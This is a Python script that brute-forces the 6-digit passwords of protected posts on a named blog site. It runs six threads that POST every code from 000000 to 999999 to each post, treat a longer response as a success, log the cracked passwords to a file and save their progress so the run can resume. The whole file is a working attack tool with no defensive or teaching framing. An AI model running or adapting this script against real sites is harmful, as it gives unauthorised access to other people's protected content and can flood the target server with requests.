import requests
import traceback
import threading
import time


def getPassword(idx):
    print(threading.current_thread().getName() + ' start')

    while True:
        url = 'https://findlifee.com/post/%d.html' % pageNum[idx]
        while url not in urlList:
            pageNum[idx] += 6
            url = 'https://findlifee.com/post/%d.html' % pageNum[idx]
        print('%s is working on %d' % (threading.current_thread().getName(), pageNum[idx]))
        found = False
        while startFrom[idx] < 1000000:
            password = str(startFrom[idx]).rjust(6, '0')
            data = {'password': password, 'submit': '查看'}
            try:
                res = requests.post(url, data=data)
                res.raise_for_status()
                if len(res.text) < 300:
                    print('%s--%d: Wrong' % (threading.current_thread().getName(), startFrom[idx]))
                else:
                    print('%s--%d: RIGHT!!!!!!!!!!!!!!!!!' % (threading.current_thread().getName(), startFrom[idx]))
                    print('%d\tOK' % pageNum[idx])
                    found = True
                    break
            except:
                print(traceback.format_exc())
                print('%s--%d\texception, url: %s' % (threading.current_thread().getName(), startFrom[idx], url))
                startFrom[idx] -= 1
            startFrom[idx] += 1
        with open('password.txt', 'a') as f:
            if not found:
                f.write('%s\tno password\n' % url)
            else:
                f.write('%s\t%s\n' % (url, password))
        with open('UrlCollection.txt', 'w') as f:
            for u in urlList:
                f.write(u + '\n')
        urlList.remove(url)
        startFrom[idx] = 0
        pageNum[idx] += 6


if __name__ == '__main__':
    pageNum = [0] * 6
    startFrom = [0] * 6
    urlList = []
    with open('kongBlog_record.txt', 'r') as f:
        for i, line in enumerate(f.readlines()):
            pageNum[i] = int(line.split(':')[0])
            startFrom[i] = int(line.split(':')[1])

    with open('kongBlog_record_backup.txt', 'w') as f:
        for p, s in zip(pageNum, startFrom):
            f.write(str(p) + ':' + str(s) + '\n')

    with open('UrlCollection.txt', 'r') as f:
        for line in f.readlines():
            urlList.append(line[:-1])


    for i in range(6):
        threading.Thread(target=getPassword, name='Thread-'+str(i+1), args=(i,)).start()

    while True:
        time.sleep(60)
        recordList = []
        for p, s in zip(pageNum, startFrom):
            recordList.append('%d:%d' % (p, s))
        with open('kongBlog_record.txt', 'w') as f:
            f.write('\n'.join(recordList))
